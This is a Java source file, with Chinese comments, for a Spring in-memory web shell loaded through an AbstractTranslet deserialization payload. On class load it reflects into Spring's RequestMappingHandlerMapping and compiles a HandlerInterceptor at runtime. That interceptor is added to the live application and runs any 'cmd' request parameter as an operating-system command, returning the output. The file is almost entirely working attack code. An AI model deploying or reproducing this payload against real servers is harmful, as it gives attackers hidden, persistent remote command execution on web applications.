import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.tools.*;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class Inject_Interceptor extends AbstractTranslet {
    public static Class<?> createShellInterceptor() throws Exception {
        String className = "DynamicShellInterceptor";
        String packageName = "com.dynamic.generated";
        String fullClassName = packageName + "." + className;

        String sourceCode = buildShellSourceCode(packageName, className);

        // 创建临时目录
        Path tempDir = Files.createTempDirectory("dynamic_classes");
        Path sourceDir = tempDir.resolve("src");
        Path classDir = tempDir.resolve("classes");
        Files.createDirectories(sourceDir);
        Files.createDirectories(classDir);

        // 写入源码文件
        Path sourceFile = sourceDir.resolve(className + ".java");
        Files.write(sourceFile, sourceCode.getBytes());

        // 编译
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();

        try (StandardJavaFileManager fileManager = compiler.getStandardFileManager(diagnostics, null, null)) {
            Iterable<? extends JavaFileObject> compilationUnits =
                    fileManager.getJavaFileObjects(sourceFile.toFile());

            File tempLibDir = Files.createTempDirectory("boot-libs").toFile();
            String bootInfClasspath = extractBootInfLibs(new File("/app/demo.jar"), tempLibDir);

            List<String> options = Arrays.asList(
                    "-d", classDir.toString(),
                    "-classpath", bootInfClasspath
            );

            JavaCompiler.CompilationTask task = compiler.getTask(
                    null, fileManager, diagnostics, options, null, compilationUnits);

            if (!task.call()) {
                throw new RuntimeException("编译失败: " + diagnostics.getDiagnostics());
            }

            // 加载类
            URLClassLoader classLoader = new URLClassLoader(
                    new URL[]{classDir.toUri().toURL()},
                    Inject_Interceptor.class.getClassLoader()
            );

            return classLoader.loadClass(fullClassName);
        } finally {
            // 清理临时文件

        }
    }
    public static String extractBootInfLibs(File bootJar, File extractToDir) throws IOException {
        List<String> jarPaths = new ArrayList<>();

        try (JarFile jarFile = new JarFile(bootJar)) {
            Enumeration<JarEntry> entries = jarFile.entries();

            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                if (entry.getName().startsWith("BOOT-INF/lib/") && entry.getName().endsWith(".jar")) {
                    // 提取JAR文件
                    String jarName = entry.getName().substring("BOOT-INF/lib/".length());
                    File outputJar = new File(extractToDir, jarName);

                    // 确保父目录存在
                    outputJar.getParentFile().mkdirs();

                    try (InputStream is = jarFile.getInputStream(entry);
                         OutputStream os = new FileOutputStream(outputJar)) {
                        // 使用传统的流复制方法
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = is.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                    }

                    jarPaths.add(outputJar.getAbsolutePath());
                }
            }
        }

        return String.join(File.pathSeparator, jarPaths);
    }

    private static String buildShellSourceCode(String packageName, String className) {
        return "package " + packageName + ";\n\n" +
                "import javax.servlet.http.HttpServletRequest;\n" +
                "import javax.servlet.http.HttpServletResponse;\n" +
                "import org.springframework.web.servlet.HandlerInterceptor;\n" +
                "import org.springframework.web.servlet.ModelAndView;\n" +
                "import java.io.PrintWriter;\n" +
                "import java.util.Scanner;\n\n" +
                "public class " + className + " implements HandlerInterceptor {\n\n" +
                "    @Override\n" +
                "    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
                "        String cmd = request.getParameter(\"cmd\");\n" +
                "        if (cmd != null && !cmd.trim().isEmpty()) {\n" +
                "            try {\n" +
                "                Process process = Runtime.getRuntime().exec(cmd);\n" +
                "                PrintWriter writer = response.getWriter();\n" +
                "                Scanner scanner = new Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");\n" +
                "                String result = scanner.hasNext() ? scanner.next() : \"\";\n" +
                "                scanner.close();\n" +
                "                writer.write(result);\n" +
                "                writer.flush();\n" +
                "                writer.close();\n" +
                "                return false; // 不再继续执行后续拦截器\n" +
                "            } catch (Exception e) {\n" +
                "                e.printStackTrace();\n" +
                "            }\n" +
                "        }\n" +
                "        return true; // 继续执行后续拦截器\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n" +
                "        // 可选的后处理逻辑\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n" +
                "        // 清理资源\n" +
                "    }\n" +
                "}";
    }
    static {
        try {
            //获取当前上下文环境
//        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // 通过 context 获取 RequestMappingHandlerMapping 对象
            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) field.get(abstractHandlerMapping);
            Class<?> shellClass = createShellInterceptor();
            adaptedInterceptors.add(shellClass.newInstance());
        }catch (Exception e){
            e.printStackTrace();
        }

    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}